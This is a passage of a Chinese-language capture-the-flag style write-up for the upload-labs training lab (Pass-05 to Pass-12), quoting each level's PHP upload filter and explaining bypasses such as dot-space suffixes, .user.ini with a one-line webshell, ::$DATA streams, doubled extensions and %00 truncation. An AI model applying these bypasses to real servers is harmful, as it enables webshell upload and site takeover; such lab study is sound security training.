punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$UPLOAD_ADDR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$UPLOAD_ADDR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'此文件不允许上传'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$UPLOAD_ADDR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>可以看到它过滤了.和空格，但只过滤了1次我们可以构造1.php. .来绕过<br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/5.png"></p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>可以看到过滤了.htaccess文件，这里可以构造php.ini 文件，php.ini 是 php的配置文件，.user.ini 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。</p><h5 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h5><ul><li>服务器脚本语言为PHP  </li><li>服务器使用CGI／FastCGI模式  </li><li>上传目录下要有可执行的php文件<br>我们需要在文件里写上auto_prepend_file&#x3D;1.jpg<br>.user.ini文件里的意思是：所有的php文件都自动包含1.jpg文件。.user.ini相当于一个用户自定义的php.ini<br>接着上传一个1.jpg文件包含一句话木马<br>我们要改一下php-ini配置文件<br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/6.png"><br>改为10这样就不用等5分钟了，然后在复制图像地址后，用蚁剑访问将文件名改为readme.php</li></ul><h2 id="upload-labs-Pass-06"><a href="#upload-labs-Pass-06" class="headerlink" title="upload-labs Pass-06"></a>upload-labs Pass-06</h2><hr><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$UPLOAD_ADDR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里没有对空格进行删除，上传.php后，用bp后进行抓包修改后缀为.php 就行了</p><h2 id="upload-labs-Pass-07"><a href="#upload-labs-Pass-07" class="headerlink" title="upload-labs Pass-07"></a>upload-labs Pass-07</h2><hr><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$UPLOAD_ADDR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里没有对点进行删除，上传.php后，用bp后进行抓包修改后缀为.php.就行了</p><h2 id="upload-labs-Pass-08"><a href="#upload-labs-Pass-08" class="headerlink" title="upload-labs Pass-08"></a>upload-labs Pass-08</h2><hr><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$UPLOAD_ADDR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里没有对::$DATA进行删除，上传.php后，用bp后进行抓包修改后缀为.php::$DATA就行了</p><h3 id="window特性"><a href="#window特性" class="headerlink" title="window特性"></a>window特性</h3><p>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</p><ul><li>例如:”phpinfo.php::$DATA”Windows会自动去掉末尾的::$DATA变成”phpinfo.php”</li></ul><h2 id="upload-labs-Pass-09"><a href="#upload-labs-Pass-09" class="headerlink" title="upload-labs Pass-09"></a>upload-labs Pass-09</h2><p>和第五题是一样的</p><h2 id="upload-labs-Pass-10白名单"><a href="#upload-labs-Pass-10白名单" class="headerlink" title="upload-labs Pass-10白名单"></a>upload-labs Pass-10白名单</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\\将定义的后缀名改为空格<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传11.php，那么他就会把你的php过滤掉。文件没有了后缀名，自然也就无法解析了。但是他是一次过滤，也就是说我们写两个php就可以了抓包改为：10.pphphp,他过滤掉一个，正好剩下了11.php</p><h2 id="upload-labs-Pass-11"><a href="#upload-labs-Pass-11" class="headerlink" title="upload-labs Pass-11"></a>upload-labs Pass-11</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_path'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>这句是用get传参，这里是一个白名单，只允许上传’jpg’,’png’,’gif’格式的文件，但是上传路径是可以控制的，可以使用%00进行截断。%00只能用于php版本低于5.3的。这里我们需要把phpstudy切换一下版本,把magic_quotes_gpc调为off<br><img src="/images/upload-labs%E9%80%9A%E5%85%B3%E8%A7%A3%E6%9E%90/7.png"><br>上传即可</p><h2 id="upload-labs-Pass-12"><a href="#upload-labs-Pass-12" class="headerlink" title="upload-labs Pass-12"></a>upload-labs Pass-12</h2><p>这题和11关差不多，只是用了post传参</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token 